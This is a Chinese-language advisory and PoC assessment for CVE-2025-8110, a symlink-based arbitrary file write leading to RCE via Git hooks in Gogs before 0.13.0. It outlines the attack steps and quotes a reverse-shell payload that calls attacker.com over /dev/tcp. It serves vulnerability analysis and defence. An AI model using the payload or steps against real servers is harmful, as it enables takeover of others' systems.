## CVE-2025-8110 - Gogs (self-hosted Git service) 远程代码执行 (RCE), 命令注入, 任意文件写入

**漏洞编号:** CVE-2025-8110

**漏洞类型:** 远程代码执行 (RCE), 命令注入, 任意文件写入

**影响应用:** Gogs (self-hosted Git service)

**危害等级:** 高危

**CVSS评分:** 8.7

**影响版本:** prior to 0.13.0

**利用条件:** 需要拥有用户权限或开放注册，且对仓库具有推送权限

**POC 可用性:** 8

**POC 类型:** 概念验证

**攻击复杂度:** 中

**投毒风险:** 0-29%

## 详情

CVE-2025-8110是一个影响Gogs（一款流行的Go语言编写的自托管Git服务）的高危远程代码执行（RCE）漏洞，CVSS评分高达8.7。该漏洞本质上是由于`PutContents` API对符号链接的处理存在缺陷，导致攻击者能够绕过文件写入验证，实现任意文件写入。此漏洞是早期目录穿越或文件覆盖漏洞修复不彻底的后果。攻击者可以通过创建一个指向`.git/hooks`目录的恶意符号链接，然后通过正常Git操作（如`git push`）将构造的恶意Git hook脚本（例如`post-receive`）写入到服务器上相应仓库的`.git/hooks/`目录中。一旦恶意hook被植入并被触发，攻击者即可在Gogs服务器上执行任意系统命令，从而完全控制受影响的Gogs实例。该漏洞影响Gogs 0.13.0版本之前的版本，并已被监测到在野利用。

**POC有效性分析：**
提供的POC代码包含三个文件：`README.md`、`bash.sh`和`exploit.py`。
`README.md`清晰地指明了受影响的软件（Gogs < 0.13.0）和漏洞类型（Git hook机制中的命令注入），为理解漏洞提供了基础信息。
`bash.sh`是一个恶意的`post-receive`钩子脚本示例，其中包含一个典型的反向shell payload (`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &`)。这部分代码展示了攻击者可以注入的实际恶意载荷，其目的是在目标服务器上建立远程控制。
`exploit.py`是一个Python脚本，用于模拟在本地环境准备一个包含恶意Git hook的仓库。它创建了一个临时目录`/tmp/malicious_repo`及其所需的`.git/hooks`子目录。随后，它将一个包含`id > /tmp/gogs_exploited`命令的恶意`post-receive` hook写入到模拟仓库中，并赋予执行权限。脚本最后提示“Malicious hook planted. Push to trigger RCE.”，表明此脚本完成了恶意载荷的本地准备工作。
尽管`exploit.py`并未直接与远程Gogs服务器进行交互或执行实际的`git push`操作，但它完整地展示了恶意hook的构造方式和本地植入过程。该POC有效地验证了漏洞的核心机制，即通过Git hook实现命令注入，并为后续针对实际Gogs服务器的利用提供了可行的代码基础。因此，此POC在概念验证层面具有很高的有效性。

**利用步骤：**
1.  **获取访问权限：** 攻击者需要识别一个运行Gogs易受攻击版本（0.13.0之前）的实例。通常需要拥有Gogs的用户凭据，或者在Gogs实例启用了开放注册时注册一个新账户，以获得对某个仓库的推送权限。
2.  **构造恶意仓库：** 在本地初始化一个Git仓库，并在其中创建一个恶意Git hook脚本（例如`post-receive`），该脚本将包含攻击者希望在Gogs服务器上执行的命令（如反向shell或文件操作命令）。
3.  **利用符号链接漏洞：** 攻击者需要利用CVE-2025-8110中的符号链接绕过缺陷，通过某种方式（例如精心构造的提交或推送操作）使Gogs服务器的`PutContents` API在处理仓库时，错误地将仓库中的某个符号链接解析为服务器上`.git/hooks/`的路径。
4.  **植入恶意Hook：** 通过正常或特殊构造的Git push操作，将包含恶意Git hook的仓库推送到受攻击的Gogs服务器。由于符号链接漏洞的存在，恶意hook脚本将被成功写入到服务器上受影响仓库的实际`.git/hooks/`目录中。
5.  **触发执行：** 当Gogs服务器处理后续的Git操作（例如另一个`git push`）时，恶意`post-receive` hook将被自动执行，从而触发其中包含的任意命令，实现远程代码执行。
6.  **结果：** 攻击者成功在Gogs服务器上执行任意命令，可能获得服务器的完全控制权、窃取数据或进行其他恶意活动。

**投毒风险分析：**
对提供的POC文件（`README.md`、`bash.sh`、`exploit.py`）进行审查后，评估其投毒风险为低（0-29%）。代码清晰、透明，没有发现混淆、恶意外部依赖或可疑的隐藏行为。
`bash.sh`和`exploit.py`中包含的反向shell或命令执行载荷（如`bash -i >& /dev/tcp/attacker.com/4444 0>&1`和`id > /tmp/gogs_exploited`）是针对*目标脆弱服务器*的攻击载荷，而非针对运行POC的研究人员机器的。`exploit.py`脚本仅在本地文件系统（`/tmp/malicious_repo`）创建目录和文件以模拟恶意仓库的构建过程，并未尝试连接外部C2服务器、下载额外组件或对研究人员系统进行未经授权的修改。其行为完全符合漏洞概念验证的目的。因此，这些POC文件对运行它们的安全研究人员而言，不构成投毒风险。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-8110
